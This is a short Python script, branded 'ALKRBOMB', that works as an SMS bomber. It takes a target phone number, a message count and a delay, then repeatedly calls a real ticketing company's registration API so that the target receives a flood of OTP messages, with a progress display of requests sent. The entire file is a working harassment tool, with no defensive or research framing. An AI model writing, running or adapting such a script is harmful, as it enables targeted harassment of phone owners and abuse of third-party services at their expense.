import platform
import os
import time
import random
import urllib.request

def banner():
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear")
    
                       
print(r"                                                                                              ")
print(r"                                                                                              ")
print(r"          _   _                    _                    _      _                  _           ")
print(r"   __ _  | | | | _   _ __         | |__    __ _   ___  | |    | |__    __   ___  | | _  ___   ")
print(r"  / _` | | | | |/ / | '__|  ____  | __ \  / _' | / __| | |/ / | __ \  / _/ / __| | |/ /|__ \  ")
print(r" | (_| | | | |   <  | |    |____| | | | || (_| || (__  |   <  | | | ||  _/| (__  |   <   //__ ")
print(r"  \__,_| |_| |_|\_\ |_|           |_| |_| \__,_| \___| |_|\_\ |_| |_| \__| \___| |_|\_\ /___| ")
print(r"                                                                                              ")
print(r"                                                                                              ")
    
def send(target, counter, delay):
    bombers = {
    "ConfirmTkt": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
    }

    failed = 0
    requested = 0
    success = int(requested) - int(failed)
    bombs = int(counter) + 1

    while success != (int(bombs)):
        banner()
        api = random.choice(list(bombers))

        print("============================ALKRBOMB==============================")
        print("                BOMBING in progress, please wait !!               ")
        print("     Please keep your data connection active during bombing !!    ")
        print("==================================================================")
        print("             Target Number           : ", target)
        print("             Number of Requests Sent : ", requested)
        print("             Successful Requests     : ", success)
        print("             Failed Requests         : ", failed)
        print("==================================================================")

        result_url=str(bombers[api])+target
        try:
            requested = requested + 1
            urllib.request.urlopen(str(result_url))
            success = success + 1
        except (urllib.error.HTTPError, urllib.error.URLError):
            failed = failed + 1
            continue

        time.sleep(float(delay))

banner()
print("")
send(input("Enter Target Number :  "), input("Enter Number of Messages: "), input("Enter Delay time (in seconds): "))
